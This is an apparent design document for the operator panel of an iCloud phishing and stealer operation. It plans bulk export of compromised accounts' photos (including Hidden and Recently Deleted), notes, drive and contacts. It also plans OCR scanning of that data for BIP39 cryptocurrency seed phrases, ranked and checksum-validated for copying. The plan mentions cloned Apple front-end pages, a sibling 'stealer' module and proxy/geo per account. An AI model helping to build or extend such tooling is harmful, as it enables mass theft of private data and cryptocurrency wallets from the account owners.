# Panel 2.0 — account console, live verification, seed/OCR search

Date: 2026-11-05
Status: proposed (awaiting approval)

## Intent

One web console replaces Telegram `/menu`. It remembers the operator login,
manages every account in real time, and opens an account the way iCloud does:
normal / Hidden / Recently Deleted photos, notes, drive, contacts, calendar,
reminders. Browsing is export-backed by default; a live check against iCloud
proves nothing is missing. Text inside downloaded images is searchable (OCR),
and BIP39 seed phrases found in notes, filenames or image text are classified
by length and checksum.

## Goals

1. Panel session survives reloads: HttpOnly signed cookie, 7 days, Disconnect
   clears it. The socket accepts the cookie (or the password for tooling).
2. Pro account management: searchable account list, status light, live updates,
   account header, per-area export progress, jobs, last error.
3. Browse the export: photos by area with thumbnails, lightbox (prev/next),
   filename + OCR search; note reader; drive tree; contacts/calendar/reminders
   tables; account/plan/storage.
4. Live verification: a worker job compares live iCloud ids/counts with the
   export manifest and returns per-area `live / exported / missing`, with a
   "Download missing" action.
5. Scan: worker OCRs images and reads notes, stores an index, and detects
   BIP39 sequences. Tiers: 5–7 words = minimum, 8–11 = medium, 12+ = high;
   checksum verified for 12/15/18/21/24 and surfaced as "valid (checksum only,
   balance not checked)". Deduplicated per account.
6. Search across notes, OCR text, filenames and seed findings, with filters
   (kind, tier, checksum).
7. Telegram keeps alerts + `/start` (panel link) + `/stats`; `/menu` and its
   account console are removed.

## Non-goals

- Writing/deleting anything in iCloud (read-only).
- Streaming full live photo thumbnails from iCloud; live is for verification.
- Balance or derivation checks of seed phrases.
- Changing the Apple front-end pages or their pixel fidelity.

## Constraints

- The socket process is the only writer of `server/data/items.json`; the web
  process reads it read-only (mtime cache) to resolve account → export folder.
- pyicloud stays in the Python worker. Verification and scanning are jobs with
  ids, progress and results over the existing worker protocol.
- Web APIs resolve paths under `export/<safe(email)>` and reject traversal.
- No new npm dependencies. Python OCR deps are added to the worker venv.
- Existing public/auth/export behaviour and tests stay green.

## Approaches considered

| Choice | Options | Decision |
| --- | --- | --- |
| Data browsing | export files vs live iCloud vs hybrid | **Export files by default + live verify job.** Live browsing of full libraries is slow and rate-limited; export is instant and survives restarts. |
| Panel auth | password each connect vs localStorage token vs HttpOnly cookie | **HttpOnly signed cookie** (HMAC, SameSite=Lax, 7 days). Cookies ignore ports, so the socket on :4001 receives it. |
| OCR | RapidOCR ONNX in the worker vs system tesseract | **RapidOCR** — pure pip, already proven in the sibling `stealer/ocr_scan.py`, no system packages. |
| Search index | JSON under `export/<email>/Scan` vs SQLite | **JSON** — a few MB per account, easy to rebuild, no Node SQLite dependency. |

## Data model

Additive to the account record:

```js
verify: {
  startedAt, finishedAt,
  areas: { photos: {live, exported, missing}, hidden: {...}, deleted: {...},
           notes: {...}, drive: {...}, contacts: {...}, calendar: {...},
           reminders: {...} },
  missing: { photos: [id...], hidden: [...], deleted: [...], notes: [...] }
},
scan: {
  startedAt, finishedAt, files, images, ocrOk, ocrFailed,
  tiers: { minimum, medium, high, valid }
}
```

Job types gain `verify` and `scan`. Everything else (queue, slots, rooms,
admin events) reuses the existing pool.

### Export scan artefacts

```
export/<email>/Scan/
  index.json      [{path, area, kind, name, text, sha256, mtime}]
  findings.json   [{file, area, name, phrase, words, tier, checksum,
                    source: "note"|"ocr"|"filename"|"text", snippet}]
  ocr/<area>/<name>.txt
```

## HTTP API (web process, cookie-protected)

| Method | Path | Returns |
| --- | --- | --- |
| POST | `/api/admin/login` `{password}` | sets `ic_admin` cookie |
| POST | `/api/admin/logout` | clears it |
| GET | `/api/admin/session` | `{ok, expiresAt}` |
| GET | `/api/admin/accounts/:id/summary` | account + export manifest summary + parsed JSON files |
| GET | `/api/admin/accounts/:id/tree?path=` | dirs/files under the export |
| GET | `/api/admin/accounts/:id/file?path=&download=1` | streams a file (images inline) |
| GET | `/api/admin/accounts/:id/gallery?area=&q=&page=` | paged photo names, OCR match |
| GET | `/api/admin/accounts/:id/search?q=&kind=&tier=` | grouped results (notes, ocr, seeds) |

The web process maps `:id` → email from `items.json`, then
`export/<safe(email)>`. `safe()` mirrors the exporter's filename sanitiser.

## Socket / worker

- `admin:verify {id}` → `verify` job; `admin:scan {id}` → `scan` job.
- Worker events: `job:verify_result`, `job:scan_progress`, `job:scan_done`,
  plus the existing `job:error`.
- Verify: enumerate live ids (photos Library/Hidden/Recent, notes, drive paths,
  contact/calendar/reminder counts), compare with manifest keys
  (`photo:<id>`, `note:<id>`, `drive:<relpath>:<size>`), emit missing ids.
- Scan: walk `export/<email>` (skip `Scan/`, `manifest.sqlite3`), OCR images
  with RapidOCR, read text files, detect BIP39 runs, write the artefacts.

## Seed rules

- Normalise text, collapse whitespace, support numbered grids (`1. word`).
- A run of consecutive BIP39 words qualifies: 5–7 minimum, 8–11 medium, 12+
  high. Longer runs are inspected at 12/15/18/21/24.
- Checksum: official BIP39 algorithm for 12/15/18/21/24 words; `valid` means
  the checksum passes. The panel labels it "checksum valid — balance not
  checked".
- Deduplicate by phrase per account; keep the first three sources.

## UI

- Left sidebar: account search + status filter, 5-per-page list (or virtual
  scroll), workers/queue footer, live indicator.
- Main: account header (email, status, proxy/geo, trusted, actions Ping /
  Export / Verify / Scan / Redownload), tabs:
  Overview · Photos · Notes · Drive · Contacts · Calendar · Reminders · Seeds · Search.
- Photos: area pills (Library / Hidden / Recently Deleted / albums), search
  (filename + OCR), lazy thumbnail grid, lightbox with ←/→/Esc, download.
  Badge when the live check says items are missing.
- Notes: list + reader; search highlights.
- Seeds: tier filters (minimum/medium/high) + "checksum valid", source
  preview/thumbnail, word count, copy phrase.
- Real time: socket events update header/status/progress; export/scan/verify
  completion refreshes the open tab.

## Telegram

- Remove `/menu`, `/accounts`, `/list`, pagination and account callbacks.
- Keep event cards and add `/start` → "Panel: `<PANEL_URL>`", `/stats` →
  accounts/jobs/workers summary.
- Account cards keep the locked/2FA/export lines.

## Tests

- Node: admin cookie login/session/logout; socket accepts cookie; export API
  tree/gallery/file + traversal rejection; items.json read-only mapping.
- Python: seed detection tiers + checksum (12-word valid/invalid, numbered
  grid, 5/8 counts); verify comparison against a fake live enumerator.
- UI: panel screenshots at 1440/390; account open → photos → lightbox.
- Existing suites (socket, auth, store, views, Python) updated and green.

## Decisions left to the builder

- Exact 5-per-page vs virtual list for accounts (5 is the current product
  rule; the sidebar can scroll).
- Thumbnail strategy: serve originals with `loading="lazy"` and CSS scaling;
  add server-side resizing only if a real account shows it is too slow.
- Whether the scan also reads `Drive/` images (yes) and videos (yes, 6 frames).
